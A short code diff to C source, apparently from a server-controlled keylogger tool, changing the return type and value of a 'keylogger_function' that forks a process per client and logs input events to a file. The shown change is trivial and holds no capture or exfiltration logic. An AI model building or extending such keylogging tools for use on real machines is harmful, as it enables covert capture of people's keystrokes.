@@ -21,7 +21,7 @@ static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_wri
 	return 1;
 }
 
-void	*keylogger_function(t_server *server, int index)
+int	keylogger_function(t_server *server, int index)
 {
 	const int	client_fd = server->clients[index].fd;
 	pid_t		pid;
@@ -81,5 +81,5 @@ void	*keylogger_function(t_server *server, int index)
 	else if (pid > 0) {
 		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
 	}
-	return (NULL);
+	return (1);
 }
